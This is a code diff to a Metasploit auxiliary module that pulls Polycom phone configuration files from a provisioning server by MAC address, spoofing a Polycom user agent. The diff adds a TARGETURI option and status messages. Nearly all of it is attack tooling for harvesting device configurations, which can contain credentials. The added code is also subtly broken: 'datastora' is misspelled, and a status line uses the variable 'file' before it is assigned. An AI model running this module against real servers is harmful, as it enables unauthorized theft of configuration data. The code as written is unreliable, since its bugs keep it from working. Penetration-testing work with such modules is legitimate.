@@ -25,6 +25,7 @@ class Metasploit3 < Msf::Auxiliary
         [
             OptString.new('MAC',   [ false, "MAC Address"]),
             OptString.new('MACFILE',   [ false, "Input file contains MAC Addresses"]),
+            OptString.new('TARGETURI', [ true, 'Target URI for configuration files', '/']),
             Opt::RHOST,
             Opt::RPORT(8088),
         ], self.class)
@@ -41,16 +42,19 @@ class Metasploit3 < Msf::Auxiliary
       macs = []
     end
     macs << datastore['MAC'].upcase if datastore['MAC']
+    uri=datastora["TARGETURI"] || "/"
 
 
     macs.each do |mac|
       begin
+        vprint_status("The initial configuration file is requesting: #{uri}#{mac.downcase}.cfg")
         res = send_request_cgi({
-           'uri'          =>  "/#{mac.downcase}.cfg",
+           'uri'          =>  "#{uri}#{mac.downcase}.cfg",
            'method'       => 'GET',
            'User-Agent'   => 'FileTransport PolycomSoundPointIP-SPIP_335-UA/4.2.2.0710',
         }, 20)
         if res.code == 200
+          vprint_status("The second configuration file is requesting: /#{file}")
           file=extract_conf_file(res.body)
           res = send_request_cgi({
              'uri'          =>  "/#{file}",
